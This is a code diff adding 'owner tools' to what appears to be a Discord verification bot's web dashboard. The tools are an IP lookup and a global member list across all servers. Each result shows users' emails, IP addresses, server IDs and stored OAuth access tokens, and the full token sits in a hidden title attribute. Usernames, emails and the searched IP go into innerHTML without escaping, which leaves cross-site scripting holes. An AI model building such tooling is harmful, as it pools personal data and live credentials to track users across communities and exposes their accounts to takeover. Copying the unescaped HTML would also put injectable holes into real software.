@@ -104,6 +104,19 @@ function dashboardPage(session) {
                 <div id="serverList" class="dash-server-list">
                     <div class="dash-loading">Loading...</div>
                 </div>
+                <div class="dash-nav-label" id="ownerSection" style="display:none">OWNER TOOLS</div>
+                <div id="ownerTools" style="display:none">
+                    <div class="dash-guild-item" id="navIpLookup">
+                        <div class="dash-guild-icon dash-guild-letter">🔍</div>
+                        <div class="dash-guild-meta"><span class="dash-guild-name">IP Lookup</span>
+                        <span class="dash-guild-count">Search by IP</span></div>
+                    </div>
+                    <div class="dash-guild-item" id="navAllMembers">
+                        <div class="dash-guild-icon dash-guild-letter">👥</div>
+                        <div class="dash-guild-meta"><span class="dash-guild-name">All Members</span>
+                        <span class="dash-guild-count">Global view</span></div>
+                    </div>
+                </div>
             </nav>
         </aside>
 
@@ -121,10 +134,20 @@ function dashboardPage(session) {
         var currentGuild = null;
         var currentTab = 'overview';
         var guildCache = {};
+        var isOwner = false;
 
         fetch('/api/dashboard/guilds', { credentials: 'include' })
             .then(function(r) { return r.json(); })
             .then(function(data) {
+                // check if user is bot owner by trying owner endpoint
+                fetch('/api/dashboard/global-members', { credentials: 'include' })
+                    .then(function(r) {
+                        if (r.ok) {
+                            isOwner = true;
+                            document.getElementById('ownerSection').style.display = '';
+                            document.getElementById('ownerTools').style.display = '';
+                        }
+                    }).catch(function() {});
                 var list = document.getElementById('serverList');
                 if (!data.guilds || data.guilds.length === 0) {
                     list.innerHTML = '<div class="dash-no-servers">No servers found</div>';
@@ -146,6 +169,101 @@ function dashboardPage(session) {
             .catch(function() {
                 document.getElementById('serverList').innerHTML = '<div class="dash-no-servers">Failed to load</div>';
             });
+
+        // owner tools click handlers
+        document.getElementById('navIpLookup').addEventListener('click', function() {
+            document.querySelectorAll('.dash-guild-item').forEach(function(el) { el.classList.remove('active'); });
+            document.getElementById('navIpLookup').classList.add('active');
+            currentGuild = null;
+            showIpLookup();
+        });
+        document.getElementById('navAllMembers').addEventListener('click', function() {
+            document.querySelectorAll('.dash-guild-item').forEach(function(el) { el.classList.remove('active'); });
+            document.getElementById('navAllMembers').classList.add('active');
+            currentGuild = null;
+            showAllMembers();
+        });
+
+        function showIpLookup() {
+            var main = document.getElementById('mainContent');
+            main.innerHTML = '<div class="dash-header"><div class="dash-header-icon dash-header-letter">🔍</div>' +
+                '<div class="dash-header-info"><h2>IP Lookup</h2><p>Search verified users by IP address</p></div></div>' +
+                '<div style="padding:20px"><div class="dash-form-row" style="margin-bottom:20px">' +
+                '<input type="text" id="ipSearchInput" class="dash-input" placeholder="Enter IP address..." style="flex:1">' +
+                '<button class="dash-btn dash-btn-primary" id="ipSearchBtn">Search</button></div>' +
+                '<div id="ipResults"></div></div>';
+
+            document.getElementById('ipSearchBtn').addEventListener('click', function() {
+                var ip = document.getElementById('ipSearchInput').value.trim();
+                if (!ip) return;
+                document.getElementById('ipResults').innerHTML = '<div class="dash-loading">Searching...</div>';
+                fetch('/api/dashboard/ip-lookup?ip=' + encodeURIComponent(ip), { credentials: 'include' })
+                    .then(function(r) { return r.json(); })
+                    .then(function(data) {
+                        if (!data.results || data.results.length === 0) {
+                            document.getElementById('ipResults').innerHTML = '<div class="dash-empty">No users found for IP ' + ip + '</div>';
+                            return;
+                        }
+                        var html = '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
+                            '<th>User</th><th>Email</th><th>Server</th><th>Token</th><th>Verified</th></tr></thead><tbody>';
+                        for (var i = 0; i < data.results.length; i++) {
+                            var m = data.results[i];
+                            var avatar = m.avatar ? 'https://cdn.discordapp.com/avatars/' + m.user_id + '/' + m.avatar + '.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
+                            var tokenDisplay = m.access_token ? m.access_token.substring(0, 12) + '...' : 'N/A';
+                            var date = m.verified_at ? new Date(m.verified_at).toLocaleDateString() : 'Unknown';
+                            html += '<tr><td class="dash-user-cell"><img src="' + avatar + '" class="dash-table-avatar">' +
+                                '<span>' + m.username + '<br><small class="text-muted">' + m.user_id + '</small></span></td>' +
+                                '<td>' + (m.email || 'N/A') + '</td>' +
+                                '<td><code>' + m.guild_id + '</code></td>' +
+                                '<td><code class="dash-token" title="' + (m.access_token || '') + '">' + tokenDisplay + '</code></td>' +
+                                '<td>' + date + '</td></tr>';
+                        }
+                        html += '</tbody></table></div>';
+                        document.getElementById('ipResults').innerHTML = '<p style="margin-bottom:10px">Found <strong>' + data.total + '</strong> result(s) for <code>' + ip + '</code></p>' + html;
+                    })
+                    .catch(function() {
+                        document.getElementById('ipResults').innerHTML = '<div class="dash-empty">Error searching</div>';
+                    });
+            });
+
+            document.getElementById('ipSearchInput').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') document.getElementById('ipSearchBtn').click();
+            });
+        }
+
+        function showAllMembers() {
+            var main = document.getElementById('mainContent');
+            main.innerHTML = '<div class="dash-header"><div class="dash-header-icon dash-header-letter">👥</div>' +
+                '<div class="dash-header-info"><h2>All Members</h2><p>Every verified user across all servers</p></div></div>' +
+                '<div id="globalMembersContent"><div class="dash-loading">Loading...</div></div>';
+
+            fetch('/api/dashboard/global-members', { credentials: 'include' })
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    if (!data.members || data.members.length === 0) {
+                        document.getElementById('globalMembersContent').innerHTML = '<div class="dash-empty">No verified members yet</div>';
+                        return;
+                    }
+                    var html = '<div style="padding:10px 20px"><p>' + data.total + ' total verified records</p></div>' +
+                        '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
+                        '<th>User</th><th>Email</th><th>IP</th><th>Server</th><th>Token</th><th>Verified</th></tr></thead><tbody>';
+                    for (var i = 0; i < data.members.length; i++) {
+                        var m = data.members[i];
+                        var avatar = m.avatar ? 'https://cdn.discordapp.com/avatars/' + m.user_id + '/' + m.avatar + '.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
+                        var tokenDisplay = m.access_token ? m.access_token.substring(0, 12) + '...' : 'N/A';
+                        var date = m.verified_at ? new Date(m.verified_at).toLocaleDateString() : 'Unknown';
+                        html += '<tr><td class="dash-user-cell"><img src="' + avatar + '" class="dash-table-avatar">' +
+                            '<span>' + m.username + '<br><small class="text-muted">' + m.user_id + '</small></span></td>' +
+                            '<td>' + (m.email || 'N/A') + '</td>' +
+                            '<td><code>' + (m.ip_address || 'N/A') + '</code></td>' +
+                            '<td><code>' + m.guild_id + '</code></td>' +
+                            '<td><code class="dash-token" title="' + (m.access_token || '') + '">' + tokenDisplay + '</code></td>' +
+                            '<td>' + date + '</td></tr>';
+                    }
+                    html += '</tbody></table></div>';
+                    document.getElementById('globalMembersContent').innerHTML = html;
+                });
+        }
 
         // event delegation for server clicks
         document.getElementById('serverList').addEventListener('click', function(e) {
